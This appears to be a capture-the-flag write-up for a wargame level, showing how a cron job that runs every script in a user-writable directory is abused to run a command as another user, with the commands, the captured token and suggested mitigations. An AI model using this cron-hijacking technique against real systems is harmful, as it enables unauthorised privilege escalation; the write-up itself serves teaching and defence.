# level05

## Goal

Obtain the privileges of the `flag05` user by exploiting a scheduled task.

## Enumeration

Search for files owned by `flag05`:

```bash
find / -user flag05 2>/dev/null
```

Result:

```text
/usr/sbin/openarenaserver
```

Check the user's mail:

```bash
cat /var/mail/level05
```

Output:

```text
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

A cron job executes `/usr/sbin/openarenaserver` every two minutes as the `flag05` user.

## Analysis

Inspect the script:

```bash
cat /usr/sbin/openarenaserver
```

The script executes every file located in:

```text
/opt/openarenaserver/
```

The directory is writable by `level05`, allowing an attacker to place arbitrary shell scripts that will later be executed by the cron job with the privileges of `flag05`.

This is a classic **Insecure Cron Job / Writable Directory** vulnerability.

## Exploitation

Create a malicious script:

```bash
echo '/bin/getflag > /tmp/flag05' > /opt/openarenaserver/script.sh
chmod +x /opt/openarenaserver/script.sh
```

Wait for the cron job to execute (maximum two minutes).

Retrieve the result:

```bash
cat /tmp/flag05
```

## Validation

Output:

```text
Check flag.Here is your token :
viuaaale9huek52boumoomioc
```

The returned token is the password for `level06`.

## Concept

This level demonstrates the danger of executing scripts from a directory writable by unprivileged users.

Execution flow:

```text
cron
    ↓
su -c "sh /usr/sbin/openarenaserver" - flag05
    ↓
openarenaserver
    ↓
execute every script in /opt/openarenaserver/
    ↓
attacker-controlled script
    ↓
getflag executed as flag05
```

## Security Impact

A privileged scheduled task should never execute files located in a user-writable directory.

Possible mitigations:

* restrict write permissions on the execution directory;
* execute only trusted scripts;
* validate ownership and permissions before execution;
* avoid wildcard execution of arbitrary files.

## Resources

Useful commands:

```bash
find / -user flag05 2>/dev/null
cat /var/mail/level05
cat /usr/sbin/openarenaserver
echo '/bin/getflag > /tmp/flag05' > /opt/openarenaserver/script.sh
chmod +x /opt/openarenaserver/script.sh
cat /tmp/flag05
```
